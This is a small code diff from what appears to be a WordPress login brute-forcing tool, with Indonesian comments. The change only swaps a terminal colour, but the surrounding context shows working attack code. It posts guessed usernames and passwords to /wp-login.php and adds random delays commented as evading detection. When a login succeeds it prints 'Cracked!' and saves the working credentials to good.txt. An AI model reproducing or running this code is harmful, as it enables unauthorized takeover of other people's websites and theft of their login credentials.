@@ -20,7 +20,7 @@ class Colors:
     yellow = '\033[1;33m'
     blue = '\033[1;34m'
     cyan = '\033[1;36m'
-    purple= '\033[1;35m'
+    white= '\033[1;37m'
     reset = '\033[0m'
 
 # Banner atau tampilan alat
@@ -80,7 +80,7 @@ def try_login(site, username, passwd):
         r = session.post(site + "/wp-login.php", data={'log': username, 'pwd': passwd}, headers=headers, timeout=30)
         time.sleep(random.uniform(0.5, 2.0))  # Jeda acak untuk menghindari deteksi
         if "wp-admin/profile.php" in r.text or r.status_code == 302:
-            print(Colors.purple + f"Cracked! --> {site}/wp-login.php : {username} : {passwd} [ WordPress ]")
+            print(Colors.white + f"Cracked! --> {site}/wp-login.php : {username} : {passwd} [ WordPress ]")
             with open("good.txt", "a") as f:
                 f.write(f"WordPress --> {site}/wp-login.php : {username} : {passwd}\n")
             return True
